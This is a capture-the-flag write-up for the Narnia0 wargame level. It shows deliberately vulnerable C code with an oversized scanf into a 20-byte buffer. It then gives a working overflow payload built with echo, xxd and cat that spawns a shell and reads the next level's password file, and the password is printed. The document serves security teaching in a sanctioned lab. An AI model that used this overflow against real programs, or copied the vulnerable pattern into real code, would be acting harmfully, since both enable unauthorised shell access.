# Narnia0

- Username: narnia0
- Password: narnia0

Source code:

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```

Interesting, this binary expects you to overwrite the memory segment of val. So
what's going on? When you start the program it ask for some input. The input is
stored in an array of 20 characters. If you input up to 19 characters (the '\n'
counts as one), nothing happens:

```shell
narnia0@narnia:~$ /narnia/narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: 1234567890123456789 
buf: 1234567890123456789
val: 0x41414141
WAY OFF!!!!
```

But if use a longer input, something happens:

```shell
narnia0@narnia:~$ /narnia/narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: 12345678901234567890
buf: 12345678901234567890
val: 0x41414100
WAY OFF!!!!
```

The value of `val` starts changing. This is because you are overflowing the
buffer and the memory you are tampering with happens to be the one assigned to
`val`. The value changes as you input more characters, but you cannot input
indefinetely long strings, because the scanf() call reads up to 24 characters.
So our input is going to be 19 characters that will act as padding and 5 extra
characters that will be our payload.

Trying some padding chars we rapidly see that the first char "pushes" a null
byte (the terminating byte of our input) and then the hexadecimal values of the
other chars ... but in reverse order. Using a tool like `xxd` we can craft the
desired 0xdeadbeef. By the way, you can send input through a pipe:

```shell
narnia0@narnia:~$ echo "12345678901234567890$(echo efbeadde|xxd -r -p)"|/narnia/narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: 12345678901234567890ﾭ�
val: 0xdeadbeef
```

The program now does accept the input, but we still don't have access to the
shell, because by using the pipe we redirected the descriptors. And we cannot
use input 0xdeadbeef with a keyboard. At least not with mine!

We can actually keep sending input. If we use a group of commands and send it
through the pipe. If the last command is `cat`, the file descriptors of `stdin`
and `stdout` are kept open and we can interact with the shell:

```shell
narnia0@narnia:~$ (echo -e "12345678901234567890$(echo efbeadde|xxd -r -p)";cat)|/narnia/narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: 12345678901234567890ﾭ�
val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1
efeidiedae
```

Not bad for a first challenge!
